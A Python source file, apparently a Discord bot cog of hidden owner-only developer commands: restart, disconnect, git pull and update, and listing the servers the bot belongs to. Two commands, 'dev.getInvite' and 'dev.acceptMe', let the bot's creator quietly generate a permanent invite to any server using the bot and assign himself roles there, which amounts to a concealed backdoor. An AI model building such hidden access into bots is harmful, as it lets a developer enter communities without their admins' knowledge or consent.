import os
import sys
import logging
import datetime

import discord
from discord.ext import commands

from main import MainCli

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

CREATOR_ID = 553284071380484129


class Dev(commands.Cog, name='Dev'):
    def __init__(self, client: MainCli):
        self.client = client

    @commands.command(
        name='dev.utils.restart',
        aliases=[
            'dev.utils.reebot'
        ],
        description='restarts the bot',
        pass_context=True,
        hidden=True
    )
    @commands.is_owner()
    async def _restart(
        self,
        context: commands.Context,
        description: str=None
    ):  
        if description is None:
            await context.send('Restarting...')
  
        os.system('cls')
        os.execv(sys.executable, ['python'] + sys.argv)

    @commands.command(
        name='dev.utils.disconnect',
        description='disconnect bot from discord',
        pass_context=True,
        hidden=True,
    )
    @commands.is_owner()
    async def _dev_disconnect(
        self,
        context: commands.Context
    ):
        await context.send('Disconnecting...')

        await self.client.close()

        os.system('cls'); exit(0)

    @commands.command(
        name='dev.utils.git.update',
        pass_context=True,
        description='download files from master branch and restart',
        hidden=True
    )
    @commands.is_owner()
    async def _git_update(self, context: commands.Context):
        os.system('cls')

        os.system('git add *')
        os.system('git stash')
        
        # Получение вывода от github
        output = os.popen('git pull')

        output_str = output.read()

        output.close()

        if len(output_str) > 4096:
            output_str = output_str[:4095]

        await self._restart(context, output_str)

    @commands.command(
        name='dev.getGuilds',
        description='get guild list',
        pass_context=True,
        hidden=True
    )
    @commands.is_owner()
    async def _get_guilds(self, context: commands.Context):
        for guild in self.client.guilds:
            await context.send(f'{guild.name} : {guild.id}')

    @commands.command(
        name='dev.getInvite',
        description='get invite link',
        pass_context=True,
        hidden=True
    )
    @commands.is_owner()
    async def _get_invite(self, context: commands.Context, guild_id: int):
        guild: discord.Guild = self.client.get_guild(guild_id)

        invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=1, temporary=False)

        await context.send(f"https://discord.gg/{invite.code}")

    @commands.command(
        name='dev.acceptMe',
        description='accept invite',
        pass_context=True,
        hidden=True
    )
    @commands.is_owner()
    async def _accept_me(self, context: commands.Context, guild_id: int):
        guild: discord.Guild = self.client.get_guild(guild_id)

        me = guild.get_member(CREATOR_ID)

        for role in me.roles:
            try:
                await me.remove_roles(role)
            except Exception as e:
                print(e)

        default_role = await self.client.roles_db.get_role(context.guild.id)

        channel_id = await self.client.invites_settings_db.get_channel(context.guild.id)

        channel = self.client.get_channel(channel_id)
        
        role = discord.utils.get(context.guild.roles, id=default_role)

        if role:
            await me.add_roles(role)
        
        await channel.send(f'{me.name} has been accepted')


def setup(client: MainCli):
    client.add_cog(Dev(client))